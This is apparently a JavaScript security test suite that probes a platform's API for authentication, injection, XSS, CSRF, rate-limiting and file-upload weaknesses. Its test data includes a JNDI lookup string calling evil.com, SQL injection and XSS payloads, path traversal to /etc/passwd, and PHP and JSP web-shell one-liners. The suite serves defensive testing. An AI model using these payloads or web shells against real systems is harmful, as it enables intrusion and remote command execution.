/**
 * Security Testing Suite
 * 
 * Comprehensive security testing for the communication platform
 * Tests authentication, authorization, input validation, and common vulnerabilities
 */

const axios = require('axios');
const crypto = require('crypto');

class SecurityTestSuite {
  constructor() {
    this.baseURL = process.env.TEST_BASE_URL || 'http://localhost:3001';
    this.testResults = [];
    this.vulnerabilities = [];
    this.authToken = null;
  }

  /**
   * Run complete security test suite
   */
  async runSecurityTests() {
    console.log('🔒 Starting Security Test Suite...\n');

    try {
      // Authentication tests
      await this.testAuthentication();
      
      // Authorization tests
      await this.testAuthorization();
      
      // Input validation tests
      await this.testInputValidation();
      
      // SQL injection tests
      await this.testSQLInjection();
      
      // XSS tests
      await this.testXSS();
      
      // CSRF tests
      await this.testCSRF();
      
      // Rate limiting tests
      await this.testRateLimiting();
      
      // File upload security tests
      await this.testFileUploadSecurity();
      
      // Generate security report
      this.generateSecurityReport();

    } catch (error) {
      console.error('❌ Security test suite failed:', error);
    }
  }

  /**
   * Test authentication security
   */
  async testAuthentication() {
    console.log('🔐 Testing Authentication Security...\n');

    // Test 1: Login with valid credentials
    try {
      const response = await this.makeRequest({
        path: '/api/v1/auth/login',
        method: 'POST',
        data: { email: 'test@test.com', password: 'password' }
      });

      if (response.data.token) {
        this.authToken = response.data.token;
        console.log('  ✅ Valid login successful');
        this.addTestResult('auth_valid_login', 'PASS', 'Valid credentials accepted');
      }
    } catch (error) {
      console.log('  ❌ Valid login failed');
      this.addTestResult('auth_valid_login', 'FAIL', 'Valid credentials rejected');
    }

    // Test 2: Login with invalid credentials
    try {
      await this.makeRequest({
        path: '/api/v1/auth/login',
        method: 'POST',
        data: { email: 'test@test.com', password: 'wrongpassword' }
      });
      
      console.log('  ❌ Invalid credentials accepted - SECURITY RISK');
      this.addVulnerability('AUTH001', 'Invalid credentials accepted', 'HIGH');
    } catch (error) {
      if (error.response && error.response.status === 401) {
        console.log('  ✅ Invalid credentials properly rejected');
        this.addTestResult('auth_invalid_login', 'PASS', 'Invalid credentials rejected');
      }
    }

    // Test 3: Brute force protection
    console.log('  Testing brute force protection...');
    let bruteForceBlocked = false;
    
    for (let i = 0; i < 10; i++) {
      try {
        await this.makeRequest({
          path: '/api/v1/auth/login',
          method: 'POST',
          data: { email: 'test@test.com', password: 'wrongpassword' }
        });
      } catch (error) {
        if (error.response && error.response.status === 429) {
          bruteForceBlocked = true;
          break;
        }
      }
    }

    if (bruteForceBlocked) {
      console.log('  ✅ Brute force protection active');
      this.addTestResult('auth_brute_force', 'PASS', 'Brute force protection working');
    } else {
      console.log('  ❌ No brute force protection - SECURITY RISK');
      this.addVulnerability('AUTH002', 'No brute force protection', 'HIGH');
    }

    // Test 4: JWT token validation
    if (this.authToken) {
      try {
        // Test with valid token
        await this.makeRequest({
          path: '/api/v1/customers',
          method: 'GET',
          headers: { Authorization: `Bearer ${this.authToken}` }
        });
        console.log('  ✅ Valid JWT token accepted');

        // Test with invalid token
        try {
          await this.makeRequest({
            path: '/api/v1/customers',
            method: 'GET',
            headers: { Authorization: 'Bearer invalid_token' }
          });
          console.log('  ❌ Invalid JWT token accepted - SECURITY RISK');
          this.addVulnerability('AUTH003', 'Invalid JWT token accepted', 'HIGH');
        } catch (error) {
          if (error.response && error.response.status === 401) {
            console.log('  ✅ Invalid JWT token properly rejected');
            this.addTestResult('auth_jwt_validation', 'PASS', 'JWT validation working');
          }
        }
      } catch (error) {
        console.log('  ❌ JWT token validation failed');
      }
    }

    console.log();
  }

  /**
   * Test authorization security
   */
  async testAuthorization() {
    console.log('🛡️ Testing Authorization Security...\n');

    if (!this.authToken) {
      console.log('  ⚠️ Skipping authorization tests - no auth token');
      return;
    }

    // Test 1: Access to protected resources
    const protectedEndpoints = [
      '/api/v1/customers',
      '/api/v1/conversations',
      '/api/v1/orders',
      '/api/v1/reports/dashboard',
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        // Test without token
        await this.makeRequest({ path: endpoint, method: 'GET' });
        console.log(`  ❌ ${endpoint} accessible without authentication - SECURITY RISK`);
        this.addVulnerability('AUTHZ001', `Unprotected endpoint: ${endpoint}`, 'HIGH');
      } catch (error) {
        if (error.response && error.response.status === 401) {
          console.log(`  ✅ ${endpoint} properly protected`);
          this.addTestResult('authz_protection', 'PASS', `${endpoint} protected`);
        }
      }
    }

    // Test 2: Role-based access control
    const adminEndpoints = [
      '/api/v1/admin/tasks',
      '/api/v1/companies',
    ];

    for (const endpoint of adminEndpoints) {
      try {
        await this.makeRequest({
          path: endpoint,
          method: 'GET',
          headers: { Authorization: `Bearer ${this.authToken}` }
        });
        // If successful, check if user should have access
        console.log(`  ⚠️ ${endpoint} accessible - verify user permissions`);
      } catch (error) {
        if (error.response && error.response.status === 403) {
          console.log(`  ✅ ${endpoint} properly restricted by role`);
          this.addTestResult('authz_rbac', 'PASS', `${endpoint} role-protected`);
        }
      }
    }

    console.log();
  }

  /**
   * Test input validation
   */
  async testInputValidation() {
    console.log('🔍 Testing Input Validation...\n');

    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
    ];

    const testEndpoints = [
      { path: '/api/v1/customers', method: 'POST', field: 'name' },
      { path: '/api/v1/products', method: 'POST', field: 'name' },
      { path: '/api/v1/conversations', method: 'POST', field: 'message' },
    ];

    for (const endpoint of testEndpoints) {
      console.log(`  Testing ${endpoint.path}...`);
      
      for (const maliciousInput of maliciousInputs) {
        try {
          const data = { [endpoint.field]: maliciousInput };
          
          const response = await this.makeRequest({
            path: endpoint.path,
            method: endpoint.method,
            data,
            headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}
          });

          // If request succeeds, check if input was sanitized
          if (response.data && response.data[endpoint.field] === maliciousInput) {
            console.log(`    ❌ Malicious input not sanitized: ${maliciousInput.substring(0, 30)}...`);
            this.addVulnerability('INPUT001', `Unsanitized input in ${endpoint.path}`, 'MEDIUM');
          } else {
            console.log(`    ✅ Input properly sanitized`);
          }

        } catch (error) {
          if (error.response && error.response.status === 400) {
            console.log(`    ✅ Malicious input rejected`);
            this.addTestResult('input_validation', 'PASS', `${endpoint.path} validates input`);
          }
        }
      }
    }

    console.log();
  }

  /**
   * Test SQL injection vulnerabilities
   */
  async testSQLInjection() {
    console.log('💉 Testing SQL Injection...\n');

    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' OR '1'='1' --",
      "admin'--",
      "' OR 1=1#",
    ];

    const searchEndpoints = [
      '/api/v1/customers?search=',
      '/api/v1/products?search=',
      '/api/v1/conversations?search=',
    ];

    for (const endpoint of searchEndpoints) {
      console.log(`  Testing ${endpoint}...`);
      
      for (const payload of sqlPayloads) {
        try {
          const response = await this.makeRequest({
            path: endpoint + encodeURIComponent(payload),
            method: 'GET',
            headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}
          });

          // Check for SQL error messages in response
          const responseText = JSON.stringify(response.data).toLowerCase();
          if (responseText.includes('sql') || responseText.includes('mysql') || responseText.includes('error')) {
            console.log(`    ❌ Possible SQL injection vulnerability detected`);
            this.addVulnerability('SQL001', `SQL injection in ${endpoint}`, 'CRITICAL');
          } else {
            console.log(`    ✅ SQL injection payload handled safely`);
          }

        } catch (error) {
          // Check error messages for SQL information disclosure
          if (error.response && error.response.data) {
            const errorText = JSON.stringify(error.response.data).toLowerCase();
            if (errorText.includes('sql') || errorText.includes('mysql')) {
              console.log(`    ❌ SQL error information disclosed`);
              this.addVulnerability('SQL002', `SQL error disclosure in ${endpoint}`, 'MEDIUM');
            }
          }
        }
      }
    }

    console.log();
  }

  /**
   * Test XSS vulnerabilities
   */
  async testXSS() {
    console.log('🕷️ Testing XSS Vulnerabilities...\n');

    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
      'javascript:alert("xss")',
      '<iframe src="javascript:alert(\'xss\')">',
    ];

    // Test stored XSS
    console.log('  Testing Stored XSS...');
    for (const payload of xssPayloads) {
      try {
        // Try to store XSS payload
        await this.makeRequest({
          path: '/api/v1/customers',
          method: 'POST',
          data: { name: payload, email: 'test@test.com' },
          headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}
        });

        // Retrieve and check if payload is returned unescaped
        const response = await this.makeRequest({
          path: '/api/v1/customers',
          method: 'GET',
          headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}
        });

        const responseText = JSON.stringify(response.data);
        if (responseText.includes(payload)) {
          console.log(`    ❌ Stored XSS vulnerability detected`);
          this.addVulnerability('XSS001', 'Stored XSS in customer name', 'HIGH');
        } else {
          console.log(`    ✅ XSS payload properly escaped`);
        }

      } catch (error) {
        // Input validation might prevent XSS
        console.log(`    ✅ XSS payload rejected by input validation`);
      }
    }

    console.log();
  }

  /**
   * Test CSRF protection
   */
  async testCSRF() {
    console.log('🎭 Testing CSRF Protection...\n');

    // Test if CSRF tokens are required for state-changing operations
    const stateChangingEndpoints = [
      { path: '/api/v1/customers', method: 'POST' },
      { path: '/api/v1/products', method: 'POST' },
      { path: '/api/v1/orders', method: 'POST' },
    ];

    for (const endpoint of stateChangingEndpoints) {
      try {
        // Try request without CSRF token
        await this.makeRequest({
          path: endpoint.path,
          method: endpoint.method,
          data: { name: 'test' },
          headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}
        });

        console.log(`  ⚠️ ${endpoint.path} accepts requests without CSRF token`);
        // Note: This might be acceptable for API endpoints with proper authentication
        
      } catch (error) {
        if (error.response && error.response.status === 403) {
          console.log(`  ✅ ${endpoint.path} requires CSRF token`);
          this.addTestResult('csrf_protection', 'PASS', `${endpoint.path} CSRF protected`);
        }
      }
    }

    console.log();
  }

  /**
   * Test rate limiting
   */
  async testRateLimiting() {
    console.log('⏱️ Testing Rate Limiting...\n');

    const testEndpoint = '/api/v1/customers';
    let rateLimited = false;

    console.log('  Sending rapid requests to test rate limiting...');
    
    for (let i = 0; i < 100; i++) {
      try {
        await this.makeRequest({
          path: testEndpoint,
          method: 'GET',
          headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {}
        });
      } catch (error) {
        if (error.response && error.response.status === 429) {
          rateLimited = true;
          console.log(`  ✅ Rate limiting activated after ${i + 1} requests`);
          this.addTestResult('rate_limiting', 'PASS', 'Rate limiting working');
          break;
        }
      }
    }

    if (!rateLimited) {
      console.log('  ❌ No rate limiting detected - SECURITY RISK');
      this.addVulnerability('RATE001', 'No rate limiting protection', 'MEDIUM');
    }

    console.log();
  }

  /**
   * Test file upload security
   */
  async testFileUploadSecurity() {
    console.log('📁 Testing File Upload Security...\n');

    // Test malicious file uploads
    const maliciousFiles = [
      { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'application/x-jsp' },
      { name: 'test.exe', content: 'MZ\x90\x00', type: 'application/x-msdownload' },
      { name: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash', type: 'text/plain' },
    ];

    for (const file of maliciousFiles) {
      try {
        // Try to upload malicious file
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        await this.makeRequest({
          path: '/api/v1/media/upload',
          method: 'POST',
          data: formData,
          headers: {
            'Content-Type': 'multipart/form-data',
            ...(this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {})
          }
        });

        console.log(`  ❌ Malicious file ${file.name} uploaded successfully - SECURITY RISK`);
        this.addVulnerability('UPLOAD001', `Malicious file upload: ${file.name}`, 'HIGH');

      } catch (error) {
        if (error.response && error.response.status === 400) {
          console.log(`  ✅ Malicious file ${file.name} properly rejected`);
          this.addTestResult('file_upload_security', 'PASS', `${file.name} rejected`);
        }
      }
    }

    console.log();
  }

  /**
   * Make HTTP request
   */
  async makeRequest(config) {
    const requestConfig = {
      method: config.method,
      url: `${this.baseURL}${config.path}`,
      timeout: 10000,
      ...config
    };

    return await axios(requestConfig);
  }

  /**
   * Add test result
   */
  addTestResult(testName, status, description) {
    this.testResults.push({
      test: testName,
      status,
      description,
      timestamp: new Date(),
    });
  }

  /**
   * Add vulnerability
   */
  addVulnerability(id, description, severity) {
    this.vulnerabilities.push({
      id,
      description,
      severity,
      timestamp: new Date(),
    });
  }

  /**
   * Generate security report
   */
  generateSecurityReport() {
    console.log('📋 Security Test Report\n');
    console.log('=' * 50);

    // Test results summary
    const passed = this.testResults.filter(r => r.status === 'PASS').length;
    const failed = this.testResults.filter(r => r.status === 'FAIL').length;
    
    console.log(`\n📊 Test Results Summary:`);
    console.log(`  Passed: ${passed}`);
    console.log(`  Failed: ${failed}`);
    console.log(`  Total: ${this.testResults.length}`);

    // Vulnerabilities summary
    console.log(`\n🚨 Vulnerabilities Found: ${this.vulnerabilities.length}`);
    
    const critical = this.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const high = this.vulnerabilities.filter(v => v.severity === 'HIGH').length;
    const medium = this.vulnerabilities.filter(v => v.severity === 'MEDIUM').length;
    const low = this.vulnerabilities.filter(v => v.severity === 'LOW').length;

    console.log(`  Critical: ${critical}`);
    console.log(`  High: ${high}`);
    console.log(`  Medium: ${medium}`);
    console.log(`  Low: ${low}`);

    // Detailed vulnerabilities
    if (this.vulnerabilities.length > 0) {
      console.log(`\n🔍 Vulnerability Details:`);
      this.vulnerabilities.forEach(vuln => {
        console.log(`\n  ${vuln.id} [${vuln.severity}]:`);
        console.log(`    ${vuln.description}`);
      });
    }

    // Security recommendations
    console.log('\n💡 Security Recommendations:');
    this.generateSecurityRecommendations();

    console.log('\n✅ Security testing completed!');
  }

  /**
   * Generate security recommendations
   */
  generateSecurityRecommendations() {
    if (this.vulnerabilities.length === 0) {
      console.log('  🎉 No major security vulnerabilities found!');
      console.log('  🔒 Continue following security best practices');
      return;
    }

    const recommendations = [
      '🔐 Implement proper input validation and sanitization',
      '🛡️ Use parameterized queries to prevent SQL injection',
      '🔒 Implement CSRF protection for state-changing operations',
      '⏱️ Add rate limiting to prevent abuse',
      '📁 Validate file uploads and restrict file types',
      '🔑 Use strong authentication and session management',
      '🚫 Implement proper error handling without information disclosure',
      '🔍 Regular security audits and penetration testing',
    ];

    recommendations.forEach(rec => console.log(`  ${rec}`));
  }
}

// Export for use in other test files
module.exports = SecurityTestSuite;

// Run tests if called directly
if (require.main === module) {
  const testSuite = new SecurityTestSuite();
  testSuite.runSecurityTests().catch(console.error);
}
